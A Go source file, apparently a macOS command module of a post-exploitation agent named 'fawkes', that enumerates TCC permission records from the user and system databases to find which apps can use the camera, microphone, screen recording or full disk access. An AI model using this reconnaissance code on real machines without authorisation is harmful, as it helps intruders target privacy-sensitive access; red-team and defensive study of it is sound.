//go:build darwin

package commands

import (
	"encoding/json"

	"fawkes/pkg/structs"
)

// TCCCheckCommand enumerates macOS Transparency, Consent, and Control (TCC) permissions.
type TCCCheckCommand struct{}

func (c *TCCCheckCommand) Name() string {
	return "tcc-check"
}

func (c *TCCCheckCommand) Description() string {
	return "Enumerate macOS TCC permissions — discover which apps have camera, microphone, screen recording, full disk access (T1082)"
}

// Helper types and functions (tccEntry, tccServiceNames, readTCCDatabase,
// formatTCCOutput, etc.) are in tcc_check_helpers.go (cross-platform) for testability.

type tccCheckArgs struct {
	Service string `json:"service"`
}

func (c *TCCCheckCommand) Execute(task structs.Task) structs.CommandResult {
	var args tccCheckArgs

	if task.Params != "" {
		if err := json.Unmarshal([]byte(task.Params), &args); err != nil {
			return errorf("Error parsing parameters: %v", err)
		}
	}

	// Determine TCC database paths
	userDB, systemDB := tccDBPaths()

	var allEntries []tccEntry

	// Read user-level TCC database
	if entries, err := readTCCDatabase(userDB, args.Service, "user"); err == nil {
		allEntries = append(allEntries, entries...)
	}

	// Read system-level TCC database (requires FDA or root)
	if entries, err := readTCCDatabase(systemDB, args.Service, "system"); err == nil {
		allEntries = append(allEntries, entries...)
	}

	if len(allEntries) == 0 {
		return successf("No TCC records found.\n\nSearched:\n  User DB:   %s\n  System DB: %s\n\nNote: System DB requires Full Disk Access or root.", userDB, systemDB)
	}

	// Format output
	output := formatTCCOutput(allEntries, args.Service, userDB, systemDB)

	return structs.CommandResult{
		Output:    output,
		Status:    "success",
		Completed: true,
	}
}

